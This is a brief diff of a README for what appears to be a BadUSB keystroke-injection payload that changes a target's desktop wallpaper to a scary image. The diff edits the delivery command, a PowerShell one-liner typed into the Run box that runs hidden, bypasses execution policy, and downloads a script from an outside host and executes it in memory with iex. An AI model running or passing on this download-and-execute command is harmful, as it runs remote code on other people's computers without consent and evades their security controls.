@@ -37,7 +37,7 @@ At that point there desktop wallpaper will be changed to the scary image provide
 * Plug in your device
 * Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
 ```
-powershell -w h -NoP -NonI -Exec Bypass iwr jakoby.lol/0tn | iex
+powershell -w h -NoP -NonI -Exec Bypass irm jakoby.lol/0tn | iex
 ```
 
 <p align="right">(<a href="#top">back to top</a>)</p>
